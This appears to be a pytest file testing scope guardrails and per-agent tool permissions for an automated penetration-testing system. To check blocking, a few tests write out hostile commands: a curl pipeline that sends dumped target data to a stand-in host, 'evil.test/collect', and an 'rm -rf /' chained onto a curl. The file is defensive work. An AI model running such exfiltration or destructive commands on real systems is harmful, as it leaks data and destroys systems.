"""Scope enforcement and tool-policy tests.

These cover the two controls that stand behind the "zero out-of-scope
exploitation attempts" requirement, so a regression here is a security
regression rather than a broken feature.

Neither service touches I/O: :meth:`GuardrailsService.check` takes an
already-loaded :class:`Scope` rather than fetching one, and
:class:`PolicyService` is a table lookup.  Resolving the scope — and failing
closed when it cannot be resolved — belongs to ``EngagementService`` and is
covered separately in ``test_tool_provider.py``.

Run with ``pytest tests/`` (pytest is a dev dependency, not in requirements.txt).
"""
from __future__ import annotations

import pytest

from mcp_tools.services.guardrails_service import (
    GuardrailsBlocked,
    GuardrailsService,
)
from mcp_tools.services.policy_service import PolicyService, ToolNotPermitted
from shared.models import Scope

GUARDRAILS = GuardrailsService()
POLICY = PolicyService()


# --------------------------------------------------------------------------- #
# Host matching
# --------------------------------------------------------------------------- #

WILDCARD = Scope(domains=["*.juice-shop.test"])


@pytest.mark.parametrize("url", [
    "https://juice-shop.test/",          # the apex, as the README smoke test submits it
    "https://api.juice-shop.test/v1",
    "https://deep.nested.juice-shop.test/",
])
def test_wildcard_admits_apex_and_subdomains(url):
    GUARDRAILS.check("http", {"url": url}, WILDCARD)


@pytest.mark.parametrize("url", [
    "https://evil.test/",
    "https://notjuice-shop.test/",       # suffix confusion: must not match
    "https://juice-shop.test.evil.test/",
])
def test_out_of_scope_hosts_blocked(url):
    with pytest.raises(GuardrailsBlocked):
        GUARDRAILS.check("http", {"url": url}, WILDCARD)


# --------------------------------------------------------------------------- #
# Path rules
# --------------------------------------------------------------------------- #

PATHS = Scope(domains=["target.test"], allow_paths=["/app/"], deny_paths=["/admin/"])


def test_path_within_allow_paths():
    GUARDRAILS.check("http", {"url": "https://target.test/app/login"}, PATHS)


def test_path_outside_allow_paths_blocked():
    with pytest.raises(GuardrailsBlocked, match="allow_paths"):
        GUARDRAILS.check("http", {"url": "https://target.test/other"}, PATHS)


def test_deny_paths_takes_precedence():
    with pytest.raises(GuardrailsBlocked, match="deny_paths"):
        GUARDRAILS.check("http", {"url": "https://target.test/admin/users"}, PATHS)


# --------------------------------------------------------------------------- #
# Sandbox commands — the target hides inside a command string
# --------------------------------------------------------------------------- #

SANDBOX_SCOPE = Scope(domains=["*.target.test"])


def test_sandbox_in_scope_command_allowed():
    GUARDRAILS.check("sandbox", {"command": "curl -s https://target.test/login"}, SANDBOX_SCOPE)


def test_sandbox_out_of_scope_command_blocked():
    with pytest.raises(GuardrailsBlocked):
        GUARDRAILS.check("sandbox", {"command": "curl https://evil.test/x"}, SANDBOX_SCOPE)


def test_sandbox_exfil_via_second_url_blocked():
    """Every URL in the command is checked, not just the first."""
    cmd = "curl 'https://target.test/dump' | curl -d @- https://evil.test/collect"
    with pytest.raises(GuardrailsBlocked):
        GUARDRAILS.check("sandbox", {"command": cmd}, SANDBOX_SCOPE)


def test_sandbox_destructive_pattern_still_blocked():
    with pytest.raises(GuardrailsBlocked, match="destructive"):
        GUARDRAILS.check("sandbox", {"command": "curl https://target.test/ ; rm -rf /"},
                         SANDBOX_SCOPE)


# --------------------------------------------------------------------------- #
# Fail-closed behaviour
# --------------------------------------------------------------------------- #

def test_empty_scope_blocks_every_network_tool():
    """A scope naming no domains authorises nothing. There is no allow-any mode."""
    with pytest.raises(GuardrailsBlocked):
        GUARDRAILS.check("http", {"url": "https://target.test/"}, Scope())


def test_network_tool_without_target_blocked():
    with pytest.raises(GuardrailsBlocked, match="no resolvable target"):
        GUARDRAILS.check("http", {}, WILDCARD)


def test_non_network_tools_need_no_target():
    """cve/attack_kb/report never touch the target, so scope does not apply."""
    GUARDRAILS.check("cve", {"query": "nginx 1.24"}, Scope())
    GUARDRAILS.check("attack_kb", {"technique": "T1190"}, Scope())


# --------------------------------------------------------------------------- #
# Tool policy
# --------------------------------------------------------------------------- #

def test_exploit_agent_may_reach_sandbox():
    POLICY.check("agent-exploit", "sandbox")


@pytest.mark.parametrize("component,tool", [
    ("agent-recon",   "sandbox"),     # discovery must never execute
    ("agent-mitre",   "http"),        # knowledge-base work has no network reach
    ("agent-adviser", "scanner"),
])
def test_tools_outside_an_agents_remit_are_denied(component, tool):
    with pytest.raises(ToolNotPermitted):
        POLICY.check(component, tool)


def test_unknown_component_denied_by_default():
    with pytest.raises(ToolNotPermitted, match="no tool policy"):
        POLICY.check("agent-rogue", "http")


def test_unknown_tool_denied_by_default():
    """A tool added to main.py but not to the policy table is unreachable."""
    with pytest.raises(ToolNotPermitted):
        POLICY.check("agent-recon", "nuclei")


def test_discovery_matches_enforcement():
    """Whatever allowed_tools advertises must actually be callable."""
    for component in ("agent-recon", "agent-vuln", "agent-mitre",
                      "agent-exploit", "agent-script", "agent-adviser"):
        for tool in POLICY.allowed_tools(component):
            POLICY.check(component, tool)
